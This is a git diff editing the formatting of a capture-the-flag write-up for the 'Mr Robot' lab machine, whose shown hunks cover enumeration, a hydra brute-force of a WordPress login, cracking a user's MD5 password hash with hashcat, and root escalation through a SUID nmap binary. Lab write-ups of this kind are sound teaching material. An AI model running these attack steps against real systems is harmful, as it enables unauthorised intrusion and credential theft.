@@ -45,13 +45,14 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 77.31 seconds
 ```
-- Analysing the scan results from nmap, I see that the machine is hosting a website on port 80 and 443. Visiting the url `http://10.114.161.84/` I see terminal looking webpage.  
+Analysing the scan results from nmap, I see that the machine is hosting a website on port 80 and 443. Visiting the url `http://10.114.161.84/` I see terminal looking webpage.  
 
 ![Web Page](screenshots/MrRobot_website_screenshot.png)
 
 ## Directory and Version Enumeration
 
 ### Summary
+
 I used gobuster tool to enumerate the website's directories and gathered information from the enumerated directories, used whatweb tool to enumerate the version of the **CMS (Content Management System)** software and identified a vulnerability that can be used against the **CMS** login page.
 
 
@@ -113,7 +114,7 @@ Finished
 ===============================================================
 ```
 
-- Looking at the results the directory enumeration, there is a few interesting directories. After going through each directory, I'll start with the `/robots` directory which discloses some information about other existing directories.  I used the **curl** command to retrieve the contents the directories.
+Looking at the results the directory enumeration, there is a few interesting directories. After going through each directory, I'll start with the `/robots` directory which discloses some information about other existing directories.  I used the **curl** command to retrieve the contents the directories.
 
 ```
 ❯ curl http://10.114.161.84/robots
@@ -165,7 +166,7 @@ I used hydra to brute force the WordPress login page, using the **`fsocity.dic`*
 
 - When the username is correct but the password is incorrect, I get a distinct `The password you entered for the username ... is incorrect.`
 
-- I started by sorting the list with this command `sort -u fsocity.dic -o fsociety.dic` to make sure there is no dublicates, then proceeded to use the list to perform a brute force attack with hydra.
+I started by sorting the list with this command `sort -u fsocity.dic -o fsociety.dic` to make sure there is no dublicates, then proceeded to use the list to perform a brute force attack with hydra.
 
 **Hydra brute force:**
 
@@ -201,7 +202,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-31 19:18:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-31 19:25:43
 ```
-- After getting the login credentials and using them to login, I get access to WordPress Admin Dashboard
+After getting the login credentials and using them to login, I get access to WordPress Admin Dashboard
 
 
 
@@ -238,7 +239,7 @@ robot
 ubuntu
 $ 
 ```
-- Enumerating the `/home` directory, I found two users, **robot** and **ubuntu**. The **robot** home directory contains the file that has the second key/flag, but I am unable to output the file's contents because I don't have enough permissions. However theres is file containing the raw-md5 password hash for the **robot** user. So I can try to login in as the **robot** if I succeed in cracking the hash.
+Enumerating the `/home` directory, I found two users, **robot** and **ubuntu**. The **robot** home directory contains the file that has the second key/flag, but I am unable to output the file's contents because I don't have enough permissions. However theres is file containing the raw-md5 password hash for the **robot** user. So I can try to login in as the **robot** if I succeed in cracking the hash.
 
 ```
 $ cd /home/robot
@@ -250,9 +251,7 @@ cat: key-2-of-3.txt: Permission denied
 $ cat password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
-I made that contains the Raw-MD5 password hash and used **Hashcat** to crack it, to get the password in plain text.
-
-
+I created a file with the contents of the Raw-MD5 password hash and used **Hashcat** to crack it, to get the password in plain text.
 
 ```
 ❯ echo 'c3fcd3d76192e4007dfb496cca67e13b' > robot_password.raw-md5
@@ -366,7 +365,7 @@ $ find / -perm -4000 2>/dev/null
 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
-Doing some research I found that the Nmap binary can exploited using this script **<a href="https://gtfobins.org/gtfobins/nmap/" target="blank">nmap --interactive</a>**, which spawns a shell with root prvileges, which can be used to read the file in the root directory where the last key/flag problably is located:
+- Doing some research I found that the Nmap binary can exploited using this script **<a href="https://gtfobins.org/gtfobins/nmap/" target="blank">nmap --interactive</a>**, which spawns a shell with root prvileges, which can be used to read the file in the root directory where the last key/flag problably is located:
 
 ```
 $ whoami
